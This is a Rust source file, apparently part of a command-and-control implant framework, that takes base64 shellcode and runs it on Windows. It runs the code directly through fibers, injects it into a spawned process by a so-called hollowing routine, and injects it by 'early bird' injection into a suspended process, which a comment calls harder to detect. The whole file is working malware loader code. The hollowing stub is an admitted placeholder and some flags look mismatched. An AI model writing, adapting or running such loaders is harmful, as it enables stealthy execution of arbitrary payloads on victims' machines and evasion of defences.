use base64::{engine::general_purpose, Engine as _};
#[cfg(target_os = "windows")]
use nexus_common::*;
use std::ffi::c_void;
use std::mem;
use std::ptr::{null, null_mut};

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, FALSE},
    System::Diagnostics::Debug::WriteProcessMemory,
    System::Memory::{
        VirtualAlloc, VirtualAllocEx, VirtualProtect, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE,
        PAGE_EXECUTE_READ, PAGE_READWRITE,
    },
    System::Threading::{
        ConvertFiberToThread, ConvertThreadToFiber, CreateFiber, CreateProcessA, DeleteFiber,
        ResumeThread, SuspendThread, SwitchToFiber, DETACHED_PROCESS, LPFIBER_START_ROUTINE,
        PROCESS_INFORMATION, STARTUPINFOA,
    },
};

// Fiber execution engine for Windows
#[cfg(target_os = "windows")]
pub struct FiberExecutor {
    encryption_key: Option<[u8; 32]>,
}

#[cfg(target_os = "windows")]
impl FiberExecutor {
    pub fn new() -> Self {
        Self {
            encryption_key: None,
        }
    }

    pub fn with_encryption_key(mut self, key: [u8; 32]) -> Self {
        self.encryption_key = Some(key);
        self
    }

    /// Execute shellcode using direct fiber execution
    pub async fn execute_direct_fiber(&self, shellcode_b64: &str) -> Result<String> {
        let shellcode = general_purpose::STANDARD
            .decode(shellcode_b64)
            .map_err(|e| NexusError::TaskExecutionError(format!("Base64 decode error: {}", e)))?;

        if shellcode.is_empty() {
            return Err(NexusError::TaskExecutionError(
                "Empty shellcode".to_string(),
            ));
        }

        if shellcode.len() > 50 * 1024 * 1024 {
            // 50MB limit
            return Err(NexusError::TaskExecutionError(
                "Shellcode too large".to_string(),
            ));
        }

        unsafe { self.execute_shellcode_with_fiber(&shellcode) }
    }

    /// Execute shellcode using process hollowing with fibers
    pub async fn execute_fiber_hollowing(
        &self,
        shellcode_b64: &str,
        target_process: &str,
    ) -> Result<String> {
        let shellcode = general_purpose::STANDARD
            .decode(shellcode_b64)
            .map_err(|e| NexusError::TaskExecutionError(format!("Base64 decode error: {}", e)))?;

        if shellcode.is_empty() {
            return Err(NexusError::TaskExecutionError(
                "Empty shellcode".to_string(),
            ));
        }

        unsafe { self.execute_via_process_hollowing(&shellcode, target_process) }
    }

    unsafe fn execute_shellcode_with_fiber(&self, shellcode: &[u8]) -> Result<String> {
        // Allocate memory for shellcode
        let buffer = VirtualAlloc(
            null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if buffer.is_null() {
            return Err(NexusError::TaskExecutionError(
                "Failed to allocate memory".to_string(),
            ));
        }

        // Copy shellcode to allocated memory
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), buffer as *mut u8, shellcode.len());

        // Change memory protection to executable
        let mut old_protect = 0u32;
        if VirtualProtect(buffer, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect) == 0 {
            return Err(NexusError::TaskExecutionError(
                "Failed to change memory protection".to_string(),
            ));
        }

        // Execute using fibers
        let fiber_result = self.execute_with_fiber_wrapper(buffer);

        // Cleanup would normally happen in a Drop implementation
        // For now, we'll leave the memory allocated since the shellcode might still be running

        match fiber_result {
            Ok(_) => Ok("Fiber shellcode executed successfully".to_string()),
            Err(e) => Err(e),
        }
    }

    unsafe fn execute_with_fiber_wrapper(&self, shellcode_ptr: *mut c_void) -> Result<()> {
        // Convert current thread to fiber
        let main_fiber = ConvertThreadToFiber(null());
        if main_fiber.is_null() {
            let error = GetLastError();
            if error != 0x00000578 {
                // ERROR_ALREADY_FIBER
                return Err(NexusError::TaskExecutionError(format!(
                    "ConvertThreadToFiber failed: {}",
                    error
                )));
            }
        }

        // Create fiber for shellcode execution
        let shellcode_fiber = CreateFiber(
            0,
            mem::transmute::<*mut c_void, LPFIBER_START_ROUTINE>(shellcode_ptr),
            null(),
        );

        if shellcode_fiber.is_null() {
            ConvertFiberToThread();
            return Err(NexusError::TaskExecutionError(format!(
                "CreateFiber failed: {}",
                GetLastError()
            )));
        }

        // Execute the fiber
        let result = std::panic::catch_unwind(|| {
            SwitchToFiber(shellcode_fiber);
        });

        // Cleanup
        if !shellcode_fiber.is_null() {
            DeleteFiber(shellcode_fiber);
        }
        if !main_fiber.is_null() {
            ConvertFiberToThread();
        }

        match result {
            Ok(_) => Ok(()),
            Err(_) => Err(NexusError::TaskExecutionError(
                "Fiber execution failed".to_string(),
            )),
        }
    }

    unsafe fn execute_via_process_hollowing(
        &self,
        shellcode: &[u8],
        target_process: &str,
    ) -> Result<String> {
        use std::ffi::CString;

        let target_path = CString::new(target_process).map_err(|e| {
            NexusError::TaskExecutionError(format!("Invalid target process path: {}", e))
        })?;

        let mut startup_info: STARTUPINFOA = mem::zeroed();
        let mut process_info: PROCESS_INFORMATION = mem::zeroed();
        startup_info.cb = mem::size_of::<STARTUPINFOA>() as u32;

        // Create target process in suspended state
        let result = CreateProcessA(
            null(),
            target_path.as_ptr() as *mut u8,
            null_mut(),
            null_mut(),
            FALSE,
            DETACHED_PROCESS,
            null_mut(),
            null(),
            &mut startup_info,
            &mut process_info,
        );

        if result == 0 {
            return Err(NexusError::TaskExecutionError(format!(
                "Failed to create target process: {}",
                GetLastError()
            )));
        }

        // Suspend the main thread
        if SuspendThread(process_info.hThread) == 0xFFFFFFFF {
            let error = GetLastError();
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return Err(NexusError::TaskExecutionError(format!(
                "Failed to suspend thread: {}",
                error
            )));
        }

        // Allocate memory in target process
        let base_address = VirtualAllocEx(
            process_info.hProcess,
            null_mut(),
            shellcode.len() + 1024, // Extra space for fiber context
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        );

        if base_address.is_null() {
            let error = GetLastError();
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return Err(NexusError::TaskExecutionError(format!(
                "Failed to allocate memory in target: {}",
                error
            )));
        }

        // Create fiber initialization shellcode stub
        let fiber_stub = self.create_fiber_stub(shellcode);

        // Write fiber stub + shellcode to target process
        let mut bytes_written = 0;
        let write_result = WriteProcessMemory(
            process_info.hProcess,
            base_address,
            fiber_stub.as_ptr() as *const c_void,
            fiber_stub.len(),
            &mut bytes_written,
        );

        if write_result == 0 || bytes_written != fiber_stub.len() {
            let error = GetLastError();
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return Err(NexusError::TaskExecutionError(format!(
                "Failed to write to target process: {}",
                error
            )));
        }

        // Change memory protection to executable
        let mut old_protect = 0u32;
        if VirtualProtectEx(
            process_info.hProcess,
            base_address,
            fiber_stub.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == 0
        {
            let error = GetLastError();
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return Err(NexusError::TaskExecutionError(format!(
                "Failed to change memory protection in target: {}",
                error
            )));
        }

        // Resume thread to execute our fiber code
        if ResumeThread(process_info.hThread) == 0xFFFFFFFF {
            let error = GetLastError();
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return Err(NexusError::TaskExecutionError(format!(
                "Failed to resume thread: {}",
                error
            )));
        }

        // Cleanup handles
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);

        Ok("Process hollowing with fibers executed successfully".to_string())
    }

    fn create_fiber_stub(&self, shellcode: &[u8]) -> Vec<u8> {
        // Create a minimal fiber initialization stub
        // This is a simplified version - in production, this would be more sophisticated
        let mut stub = Vec::new();

        // Simple x64 shellcode that:
        // 1. Converts thread to fiber
        // 2. Creates fiber for our shellcode
        // 3. Switches to our fiber
        let fiber_init: &[u8] = &[
            // Save registers
            0x48, 0x83, 0xEC, 0x28, // sub rsp, 28h (align stack + shadow space)
            // ConvertThreadToFiber(NULL)
            0x48, 0x31, 0xC9, // xor rcx, rcx
            // Note: In a real implementation, we'd need to dynamically resolve the API address
            // For now, this is a placeholder that would need API resolution

            // Add a simple infinite loop to prevent crashes during development
            0xEB, 0xFE, // jmp $ (infinite loop)
        ];

        stub.extend_from_slice(fiber_init);

        // Append the actual shellcode after a small offset
        stub.resize(512, 0x90); // NOP padding
        stub.extend_from_slice(shellcode);

        stub
    }

    /// Execute shellcode with early bird injection technique using fibers
    pub async fn execute_early_bird_fiber(
        &self,
        shellcode_b64: &str,
        target_process: &str,
    ) -> Result<String> {
        let shellcode = general_purpose::STANDARD
            .decode(shellcode_b64)
            .map_err(|e| NexusError::TaskExecutionError(format!("Base64 decode error: {}", e)))?;

        unsafe { self.execute_early_bird_injection(&shellcode, target_process) }
    }

    unsafe fn execute_early_bird_injection(
        &self,
        shellcode: &[u8],
        target_process: &str,
    ) -> Result<String> {
        // Early bird injection creates a process in suspended state,
        // injects code before the main thread starts, then resumes execution
        // This technique is harder to detect since injection happens before process initialization

        use std::ffi::CString;
        let target_path = CString::new(target_process).map_err(|e| {
            NexusError::TaskExecutionError(format!("Invalid target process path: {}", e))
        })?;

        let mut startup_info: STARTUPINFOA = mem::zeroed();
        let mut process_info: PROCESS_INFORMATION = mem::zeroed();
        startup_info.cb = mem::size_of::<STARTUPINFOA>() as u32;

        // Create process in suspended state for early bird injection
        let result = CreateProcessA(
            null(),
            target_path.as_ptr() as *mut u8,
            null_mut(),
            null_mut(),
            FALSE,
            0x00000004, // CREATE_SUSPENDED
            null_mut(),
            null(),
            &mut startup_info,
            &mut process_info,
        );

        if result == 0 {
            return Err(NexusError::TaskExecutionError(format!(
                "Failed to create suspended process: {}",
                GetLastError()
            )));
        }

        // Allocate and inject shellcode before process starts
        let base_address = VirtualAllocEx(
            process_info.hProcess,
            null_mut(),
            shellcode.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        );

        if base_address.is_null() {
            let error = GetLastError();
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return Err(NexusError::TaskExecutionError(format!(
                "VirtualAllocEx failed: {}",
                error
            )));
        }

        let mut bytes_written = 0;
        let write_result = WriteProcessMemory(
            process_info.hProcess,
            base_address,
            shellcode.as_ptr() as *const c_void,
            shellcode.len(),
            &mut bytes_written,
        );

        if write_result == 0 {
            let error = GetLastError();
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return Err(NexusError::TaskExecutionError(format!(
                "WriteProcessMemory failed: {}",
                error
            )));
        }

        let mut old_protect = 0u32;
        if VirtualProtectEx(
            process_info.hProcess,
            base_address,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == 0
        {
            let error = GetLastError();
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return Err(NexusError::TaskExecutionError(format!(
                "VirtualProtectEx failed: {}",
                error
            )));
        }

        // Resume the process - our code will execute as part of process initialization
        if ResumeThread(process_info.hThread) == 0xFFFFFFFF {
            let error = GetLastError();
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
            return Err(NexusError::TaskExecutionError(format!(
                "ResumeThread failed: {}",
                error
            )));
        }

        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);

        Ok("Early bird injection with fibers executed successfully".to_string())
    }

    /// Validate shellcode format and basic safety checks
    fn validate_shellcode(&self, shellcode: &[u8]) -> Result<()> {
        if shellcode.is_empty() {
            return Err(NexusError::TaskExecutionError(
                "Empty shellcode".to_string(),
            ));
        }

        if shellcode.len() > 100 * 1024 * 1024 {
            // 100MB limit
            return Err(NexusError::TaskExecutionError(
                "Shellcode exceeds size limit".to_string(),
            ));
        }

        // Basic shellcode validation (check for obvious nulls, etc.)
        if shellcode.len() < 4 {
            return Err(NexusError::TaskExecutionError(
                "Shellcode too small".to_string(),
            ));
        }

        Ok(())
    }
}

// Fallback for non-Windows platforms
#[cfg(not(target_os = "windows"))]
pub struct FiberExecutor;

#[cfg(not(target_os = "windows"))]
impl FiberExecutor {
    pub fn new() -> Self {
        Self
    }

    pub fn with_encryption_key(self, _key: [u8; 32]) -> Self {
        self
    }

    pub async fn execute_direct_fiber(&self, _shellcode_b64: &str) -> Result<String> {
        Err(NexusError::TaskExecutionError(
            "Fiber execution not supported on this platform".to_string(),
        ))
    }

    pub async fn execute_fiber_hollowing(
        &self,
        _shellcode_b64: &str,
        _target_process: &str,
    ) -> Result<String> {
        Err(NexusError::TaskExecutionError(
            "Fiber hollowing not supported on this platform".to_string(),
        ))
    }

    pub async fn execute_early_bird_fiber(
        &self,
        _shellcode_b64: &str,
        _target_process: &str,
    ) -> Result<String> {
        Err(NexusError::TaskExecutionError(
            "Early bird injection not supported on this platform".to_string(),
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_fiber_executor_creation() {
        let executor = FiberExecutor::new();
        // Just test that we can create the executor
        let _executor_with_key = executor.with_encryption_key([0u8; 32]);
    }

    #[cfg(target_os = "windows")]
    #[tokio::test]
    async fn test_invalid_shellcode() {
        let executor = FiberExecutor::new();

        // Test empty shellcode
        let result = executor.execute_direct_fiber("").await;
        assert!(result.is_err());

        // Test invalid base64
        let result = executor.execute_direct_fiber("invalid_base64!").await;
        assert!(result.is_err());
    }

    #[cfg(not(target_os = "windows"))]
    #[tokio::test]
    async fn test_non_windows_fallback() {
        let executor = FiberExecutor::new();

        let result = executor.execute_direct_fiber("dGVzdA==").await; // "test" in base64
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not supported"));
    }
}
